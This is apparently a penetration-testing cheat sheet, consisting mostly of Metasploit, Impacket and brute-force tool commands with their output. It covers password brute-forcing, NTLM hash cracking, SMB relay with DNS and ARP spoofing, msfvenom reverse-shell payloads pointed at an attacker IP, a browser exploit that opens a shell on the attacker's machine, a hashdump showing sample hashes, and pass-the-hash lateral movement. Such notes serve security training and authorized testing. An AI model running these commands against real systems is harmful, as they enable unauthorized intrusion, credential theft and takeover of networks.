# Exploitation

## Vulnerability Assessment
[OpenVAS](https://www.openvas.org/)
[nexpose](https://www.rapid7.com/products/nexpose/)
[GFI LAN Guard](https://www.gfi.com/products-and-solutions/network-security-solutions/gfi-languard)
[Nessus](https://www.tenable.com/products/nessus)
***
***

## Low Hanging Fruits

For password:

1. **Ncrack**
[ncrack](https://nmap.org/ncrack/)
`ncrack 10.10.10.0/24`
`ncrack els.com`
`ncrack 10.10.10.1-100`
`ncrack 10.10.10.10`
Ncrack support: FTP, SSH, TELNET, HTTP(S), POP3(S), SMB, RDP, VNC
Syntax: `ncrack <service_name>://target:<port_numner>`
Example: `ncrack telnet://10.10.10.0:25`
If not given port number it takes default port number.
`ncrack ssh://10.10.10.130 telnet://10.10.10.160:138`
`ncrack 10.10.10.10,15 -p ssh:50,telnet`
`-U` - To provide username wordlist.
`-P` - to provide passwords wordlist.
`-u` - to provide username.
`-p` - to provide password.
`--password-first`
`-f` - for exit with first successful attempt.

2. **Medusa**
[Medusa](http://h.foofus.net/?page_id=51), [Medusa Git repositery](https://github.com/jmk-foofus/medusa)
`-h` target
`-H` file contaning targets
`-u` username to test
`-U` file containing user names
`-p` password to test
`-P` file containg password to test
`medusa -h 10.10.10.10 -M telnet -U usernames.txt -P password.txt`
3. **Patator**
[patator](https://github.com/lanjelot/patator)
`patator ssh_login host=10.10.10.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed'`
syntax: `patator [module] host=FILE0 user=FILE1 password=FILE2 0=host.txt 1=login.txt 2=pass.txt`
4. **EyeWitness**
[EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) - it uses default credentials.
`python EyeWitness.py --headless --prepend-https -f url.txt`
`--active-scan`

<br>
For keyword generation:

1. **Rsmangler**
[rsmangler](https://digi.ninja/projects/rsmangler.php)
`cat words.txt | rsmangler --file - > words_new.txt`
2. **CeWL**
[CeWL](https://digi.ninja/projects/cewl.php)
`cewl -m 8 https://www.google.com` - can be used to scrape website to generate word list.
3. **Mentalist**
[mentalist](https://github.com/sc0tfree/mentalist) is a gui based keyword generator.
***
***

## Exploitation

**LM/NTLMv1**
`auxiliary/server/capture/smb`
`john --format=netlm hash`
[rcracki_mt](https://github.com/foreni-packages/rcracki_mt) is windows tool.
[http://project-rainbowcrack.com/table.htm](http://project-rainbowcrack.com/table.htm)
[https://ophcrack.sourceforge.io/tables.php](https://ophcrack.sourceforge.io/tables.php)
`rcracki_mt -h [first 8 byte of LMHASH] -t 4 *.rti`
In folder metasploit-framework/tools/password there is a ruby file called halflm_second.rb
`ruby halflm_second.rb -n [complete hash] -p [the password got]`

From john folder `perl netntlm.pl -file /root/hashpwd_netntlm -seed [password got]`

Insted of halflm_second we can use `perl netntlm.pl -file /root/hashpwd_netntlm -seed [First half uppercase password]`

**NTLMv2 smb relay**

Metasploit: smb_relay attack
>>msf exploit(smb_relay) > `set SRVHOST 172.16.5.150`
SRVHOST => 172.16.5.150
msf exploit(smb_relay) > `set PAYLOAD windows/meterpreter/reverse_tcp`
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(smb_relay) > `set LHOST 172.16.5.150`
LHOST => 172.16.5.150
msf exploit(smb_relay) > `set SMBHOST 172.16.5.10` //172.16.5.10 is the DNS server.
SMBHOST => 172.16.5.10
msf exploit(smb_relay) > `exploit`

`echo "172.16.5.150 *.sportsfoo.com" > dns`
`dnsspoof -i tap0 -f dns`
`echo 1 > /proc/sys/net/ipv4/ip_forward`
`arpspoof -i tap0 -t 172.16.5.30 172.16.5.1`
`arpspoof -i tap0 -t 172.16.5.1 172.16.5.30`


Impacket: smbrelayx.py
>>Create a payload.exe with msfvenom.
`sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Attacker_IP] LPORT=[Listening_port]  -f exe -o payload.exe`
Start a handler in metasploit and run `smbrelayx.py -h [target_host] -e payload.exe`

**Client Side explotation**

For client-side exploitation use module 'firefox_pdfjs_privilege_escalation'.
>>Then when client clicks on the link generated will start shell in attacker machine.
msf > `use exploit/multi/browser/java_jre17_exec`
msf exploit(java_jre17_exec) > `set SRVHOST 192.168.70.45`
msf exploit(java_jre17_exec) > `set URIPATH /agenda`
msf exploit(java_jre17_exec) > `set TARGET 1`
msf exploit(java_jre17_exec) > `set PAYLOAD windows/meterpreter/reverse_tcp`
msf exploit(java_jre17_exec) > `set LHOST 192.168.70.45`
msf exploit(java_jre17_exec) > `set LPORT 443`
msf exploit(java_jre17_exec) > `exploit`

[*] Exploit running as background job
[*] Started reverse handler on 192.168.70.45:443
[*] Using URL: http://192.168.70.45:8080/agenda
[*] Server started.
***
***
## VA and Exploitation
Expoit a machine and obtain the hashes.
>>`meterpreter > hashdump`
Administrator:500:6df60586675b97c51f6252914a7633d7:fc5399dc481550f5442d1585e10c0345:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:485abeee55c20847527b7d40c923ce73:800a821fd8e8fd957fb7e2142e4ec10a:::
netadmin:1003:a4fd0910b9418e67d342ec751ef6b28d:6757a9560a881a505b9fa7bfadd88874:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:0753109d18a27933666907e9069009c2:::>>

Then it use the hash to get foot hold on other hosts:
>>`msf exploit(ms08_067_netapi) > use auxiliary/scanner/smb/psexec_scanner`
`msf auxiliary(psexec_scanner) > set PAYLOAD windows/meterpreter/reverse_tcp`
PAYLOAD => windows/meterpreter/reverse_tcp
`msf auxiliary(psexec_scanner) > set LHOST 172.16.5.42`
LHOST => 172.16.5.41
`msf auxiliary(psexec_scanner) > set LPORT 4455`
LPORT => 4455
`msf auxiliary(psexec_scanner) > set RHOSTS 10.50.97.4-22`
RHOSTS => 10.50.97.4-22
`msf auxiliary(psexec_scanner) > set SMBUSER netadmin`
SMBUser => netadmin
`msf auxiliary(psexec_scanner) > set SMBPass` a4fd0910b9418e67d342ec751ef6b28d:6757a9560a881a505b9fa7bfadd88874
`SMBPass => a4fd0910b9418e67d342ec751ef6b28d:6757a9560a881a505b9fa7bfadd88874`
`msf auxiliary(psexec_scanner) > set THREADS 10`
`THREADS => 10`
`msf auxiliary(psexec_scanner) > run`
***
***

## Nessus via Metaspoit

Plugin link: wget https://raw.githubusercontent.com/darkoperator/Metasploit-Plugins/master/pentest.rb
`service nessusd start`
`https://ajith:8834`
`nmap -sn -oG - 192.168.78.* | awk '/Up$/ {print $2}'`
Scan the nessus once completed.
Then in metasploit:
>>`load nessus`
`nessus_scan_list`
`nessus_report_hosts [scan_id]`
`nessus_db_import [scan_id]`
`vulns`
`load pentest`
`vuln_exploit`
***
***
